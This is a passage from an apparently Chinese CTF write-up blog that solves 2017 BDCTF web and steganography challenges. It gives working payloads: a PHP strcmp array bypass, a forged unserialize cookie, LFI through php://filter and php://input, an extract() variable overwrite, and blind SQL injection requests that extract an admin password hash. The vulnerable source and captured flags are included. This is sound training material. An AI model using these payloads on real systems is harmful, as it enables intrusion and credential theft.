<p><code>flag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF</code></p>
</blockquote>
<p>使用了Quoted Printable encode，<a href="http://www.webatic.com/run/convert/qp.php" target="_blank" rel="external">在线解码</a> 可知隐藏了flag，让其显示即可。<code>BDCTF{Y0u_4Re_5ucCe5SFul}</code></p>
<p>队友将文件另存为XML，打开也可见flag。</p>
<p><img src="qpdecode.png" alt=""><img src="jiuzaiyanqian-flag.png" alt=""></p>
<hr>
<h2 id="2017-10-30"><a href="#2017-10-30" class="headerlink" title="2017/10/30"></a>2017/10/30</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><blockquote>
<p>更大的数，格式bdctf{xxx}<br><a href="http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080" target="_blank" rel="external">http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080</a></p>
</blockquote>
<p>修改表单长度限制。<code>bdctf{s0m2thing_ju8t_1ik2_thi8}</code></p>
<h4 id="简单的题"><a href="#简单的题" class="headerlink" title="简单的题"></a>简单的题</h4><blockquote>
<p>格式flag{xxxx}<br><a href="http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080" target="_blank" rel="external">http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)</div><div class="line">        <span class="keyword">die</span>($flag);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"密码不正确！"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>post一个数组 <code>password[]=</code> 即可。<code>flag{Y0u_4re_G3t_FLAG_452}</code></p>
<h4 id="WEB100-2"><a href="#WEB100-2" class="headerlink" title="WEB100-2"></a>WEB100-2</h4><blockquote>
<p>提示是?hint，格式是flag{xxxx}<br><a href="http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080" target="_blank" rel="external">http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080</a></p>
</blockquote>
<p>根据提示访问<a href="http://127.0.0.1/ctfoj/bdctf.php?hint" target="_blank" rel="external">http://127.0.0.1/ctfoj/bdctf.php?hint</a> 得到源码。<br>带上<code>Cookie: BDCTF=s:21:&quot;BDCTF:www.bluedon.com&quot;%3b</code> 即可得到<code>flag{pBXeeZdOkG1QTP1}</code> 。cookie中的分号要url编码一下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">error_reporting(<span class="number">0</span>);  </div><div class="line">$KEY=<span class="string">'BDCTF:www.bluedon.com'</span>;  </div><div class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);  </div><div class="line"></div><div class="line">$cookie = $_COOKIE[<span class="string">'BDCTF'</span>];  </div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;  </div><div class="line">    show_source(<span class="keyword">__FILE__</span>);  </div><div class="line">&#125;  </div><div class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)  </div><div class="line">&#123;     </div><div class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;  </div><div class="line">&#125;  </div><div class="line"><span class="keyword">else</span> &#123;  foo</div></pre></td></tr></table></figure>
<h4 id="蓝盾管理员"><a href="#蓝盾管理员" class="headerlink" title="蓝盾管理员"></a>蓝盾管理员</h4><blockquote>
<p>you are not bd-admin，格式bdctf{xxx}<br><a href="http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080" target="_blank" rel="external">http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080</a></p>
</blockquote>
<p>访问<code>view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&amp;user=php://input</code> 同时post <code>the user is bdadmin</code> 得到<code>bd-admin!&lt;br&gt;PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+</code> ，解码后得到<code>bdctf{Lfi_AnD_More}</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line">&lt;!--  </div><div class="line">@$user = $_GET[<span class="string">"user"</span>];  </div><div class="line">@$file = $_GET[<span class="string">"file"</span>];  </div><div class="line">  </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is bdadmin"</span>))&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello bd-admin!&lt;br&gt;"</span>;  </div><div class="line">	<span class="keyword">include</span>($file); <span class="comment">//flag.php  </span></div><div class="line">&#125;<span class="keyword">else</span>&#123;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not bd-admin ! "</span>;  </div><div class="line">&#125;  </div><div class="line"> --&gt;</div></pre></td></tr></table></figure>
<h4 id="送大礼"><a href="#送大礼" class="headerlink" title="送大礼"></a>送大礼</h4><blockquote>
<p>格式bdctf{xxx}<br><a href="http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080" target="_blank" rel="external">http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080</a></p>
</blockquote>
<p>访问 <code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt</code>  有jsfuck，<a href="http://codertab.com/jsunfuck" target="_blank" rel="external">解开</a> 后内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">extract($_GET);  </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($bdctf))  </div><div class="line">&#123;      </div><div class="line">  $content=trim(file_get_contents($flag));</div><div class="line">  <span class="keyword">if</span>($bdctf==$content)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">echo</span><span class="string">'bdctf&#123;**********&#125;'</span>;</div><div class="line">  &#125;    <span class="keyword">else</span></div><div class="line">  &#123; </div><div class="line">    <span class="keyword">echo</span><span class="string">'这不是蓝盾的密码啊'</span>;</div><div class="line">  &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>访问 <code>http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&amp;flag=php://input</code> 同时post <code>foo</code> 得到<code>bdctf{UCCdlsZyVe}</code> 。</p>
<h4 id="火星撞地球"><a href="#火星撞地球" class="headerlink" title="火星撞地球"></a>火星撞地球</h4><blockquote>
<p>flag{1q2w3e4r}<br>密码就是答案，格式flag{xxxx}<br><a href="http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080" target="_blank" rel="external">http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080</a></p>
</blockquote>
<p>获取当前数据库名member</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=admin<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>(ASCII(MID((database()),<span class="number">6</span>,<span class="number">1</span>)))=<span class="number">114</span><span class="symbol">%23</span>&amp;password=<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span>&amp;submit<span class="number">2</span>=<span class="symbol">%E4</span><span class="symbol">%BC</span><span class="symbol">%9</span>A<span class="symbol">%E5</span><span class="symbol">%91</span><span class="symbol">%98</span><span class="symbol">%E7</span><span class="symbol">%99</span><span class="symbol">%BB</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span></div></pre></td></tr></table></figure>
<p>当前数据库只有一个表</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=admin<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>(ASCII(MID((<span class="keyword">select</span><span class="symbol">%20</span>count(table_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">49</span><span class="symbol">%23</span>&amp;password=<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span>&amp;submit<span class="number">2</span>=<span class="symbol">%E4</span><span class="symbol">%BC</span><span class="symbol">%9</span>A<span class="symbol">%E5</span><span class="symbol">%91</span><span class="symbol">%98</span><span class="symbol">%E7</span><span class="symbol">%99</span><span class="symbol">%BB</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span></div></pre></td></tr></table></figure>
<p>当前表名为member</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=admin<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>(ASCII(MID((<span class="keyword">select</span><span class="symbol">%20</span>table_name<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()<span class="symbol">%20</span>limit<span class="symbol">%200</span>,<span class="number">1</span>),<span class="number">7</span>,<span class="number">1</span>)))&gt;<span class="number">0</span><span class="symbol">%23</span>&amp;password=<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span>&amp;submit<span class="number">2</span>=<span class="symbol">%E4</span><span class="symbol">%BC</span><span class="symbol">%9</span>A<span class="symbol">%E5</span><span class="symbol">%91</span><span class="symbol">%98</span><span class="symbol">%E7</span><span class="symbol">%99</span><span class="symbol">%BB</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span></div></pre></td></tr></table></figure>
<p>当前表有四条记录</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=admin<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>(ASCII(MID((<span class="keyword">select</span><span class="symbol">%20</span>count(*)<span class="symbol">%20</span>from<span class="symbol">%20</span>member),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">52</span><span class="symbol">%23</span>&amp;password=<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span>&amp;submit<span class="number">2</span>=<span class="symbol">%E4</span><span class="symbol">%BC</span><span class="symbol">%9</span>A<span class="symbol">%E5</span><span class="symbol">%91</span><span class="symbol">%98</span><span class="symbol">%E7</span><span class="symbol">%99</span><span class="symbol">%BB</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span></div></pre></td></tr></table></figure>
<p>得到列名’id,member_user,member_password,member_name，。。。’</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=admin<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>(ASCII(MID((<span class="keyword">select</span><span class="symbol">%20</span>group_concat(column_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema='member'),<span class="number">44</span>,<span class="number">1</span>)))&gt;<span class="number">44</span><span class="symbol">%23</span>&amp;password=<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span>&amp;submit<span class="number">2</span>=<span class="symbol">%E4</span><span class="symbol">%BC</span><span class="symbol">%9</span>A<span class="symbol">%E5</span><span class="symbol">%91</span><span class="symbol">%98</span><span class="symbol">%E7</span><span class="symbol">%99</span><span class="symbol">%BB</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span></div></pre></td></tr></table></figure>
<p>查询密码字段 burp爆破得到’5416d7cd6ef195a0f7622a9c56b55e84’，即’1q2w3e4r’。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=admin<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>(ASCII(MID((<span class="keyword">select</span><span class="symbol">%20</span>member_password<span class="symbol">%20</span>from<span class="symbol">%20</span>member<span class="symbol">%20</span>where<span class="symbol">%20</span>member_user='admin'),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">53</span><span class="symbol">%23</span>&amp;password=<span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%201</span>&amp;submit<span class="number">2</span>=<span class="symbol">%E4</span><span class="symbol">%BC</span><span class="symbol">%9</span>A<span class="symbol">%E5</span><span class="symbol">%91</span><span class="symbol">%98</span><span class="symbol">%E7</span><span class="symbol">%99</span><span class="symbol">%BB</span><span class="symbol">%E5</span><span class="symbol">%BD</span><span class="symbol">%95</span></div></pre></td></tr></table></figure>
<p>最后flag为<code>flag{1q2w3e4r}</code> </p>
<h4 id="密室杀人案-x"><a href="#密室杀人案-x" class="headerlink" title="密室杀人案[x]"></a>密室杀人案[x]</h4><blockquote>
<p>格式bdctf{xxxx}<br><a href="http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080" target="_blank" rel="external">http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080</a></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bdctf--密室谋杀案</div><div class="line">这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。</div></pre></td></tr></table></figure>
<h4 id="bluedon用户-x"><a href="#bluedon用户-x" class="headerlink" title="bluedon用户[x]"></a>bluedon用户[x]</h4><blockquote>
<p>格式，bdctf{xxxxx}<br><a href="http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080" target="_blank" rel="external">http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//index.php</span></div><div class="line">you are not bluedon ! </div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is bluedon"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello bluedon!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not bluedon ! "</span>;</div><div class="line">&#125;</div><div class="line"> --&gt;</div><div class="line">   </div><div class="line"><span class="comment">//class.php</span></div><div class="line"><span class="comment">//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&amp;user=php://input</span></div><div class="line"></div><div class="line">the user is bluedon</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"恭喜get flag"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a class="article-share-link" data-url="https://findneo.github.io/2017/10/2017-miac-writeup/" data-id="cjefxfsx5000a9ggyaf4wfp9g" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3a0W7CMAwFUP7/p5m0p0ms5dqm05qcPFVQGp8+mDjO4xGP5/d4vf75yc+R3/l6/+uvPjYwMDBuy3iejvNAk+DyF3F0nTwfAwNjB0aSZM8nq6bj6pPfxIyBgYExTrLV5I6BgYExYfTCTUJJymAMDIydGXkSPJ8y2TLLf3tJLY6BgXFDxqQxcPX1H/U3MDAw/jHjWRy9ZVx1kVeOCgMDY2lG9ahEr21wjp+cqXj0TnxgYGDckHH+dW/jPi9W82MW5U03DAyMhRiTIxTVKSctzzdzYWBgLMrIU141XTYXdq1SFgMDYwdGvik2CeK6gx0YGBhrM6pHLvJpqp9XX8To5AgGBsatGHmI1U2x/P58w+4wWgwMjA0Y+VbapFjt/Q8kRzEwMDDWZuTF5GfL1EmLNIoQAwNjIcYVrcdqids7bHH4v4GBgbEBo1pe5ik1aWFWn4CBgbEP44plXzN1Fp+AgYGxD6OXZKsLxGp5XPgWAwNjacZ8w6vXdOwtAd9EgoGBsShjkmqT0jdJu3nD4DAqDAyMjRkT3mTZV07oGBgYSzPyMrV3CKNXAJ+PhIqBgbES41kck5ZAMmPelih3YjEwMG7LyEf1IFc+cW+zDwMDYzfGJAn2FoiToxVRCxMDA2NRRi/J9pLpp4rYXxIuBgbG9oxJUs7L42o8GBgYGHnqzLfJJsn3YwkXAwPjhow8mTaXbnHzsveyMDAw1mb0GgPV9Dqfa9S8xMDAuCvjC4si9Rt7hwvhAAAAAElFTkSuQmCC">分享</a><div class="tags"><a href="/tags/ctf/">ctf</a></div><div class="post-nav"><a class="pre" href="/2017/10/python-snippets/">用python实现几种常见简单加密</a><a class="next" href="/2017/10/nupt-vigenere/">南邮CTF平台 Vigenere writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/code/">code</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/奇技淫巧/">奇技淫巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/社区投稿/">社区投稿</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/code/" style="font-size: 15px;">code</a> <a href="/tags/C/" style="font-size: 15px;">C</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/hacklife/" style="font-size: 15px;">hacklife</a> <a href="/tags/命令注入/" style="font-size: 15px;">命令注入</a> <a href="/tags/Batch/" style="font-size: 15px;">Batch</a> <a href="/tags/密码学/" style="font-size: 15px;">密码学</a> <a href="/tags/sqli/" style="font-size: 15px;">sqli</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/网络/" style="font-size: 15px;">网络</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://ph0en1x.com/" title="Ph0en1x ctf team" target="_blank">Ph0en1x ctf team</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a><ul></ul><a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a><ul></ul><a href="https://madsome.cn/" title="Mads" target="_blank">Mads</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">findneo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.2.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.2.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = '//hm.baidu.com/hm.js?' + '46a32286256dd65996099e45157ca245';
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>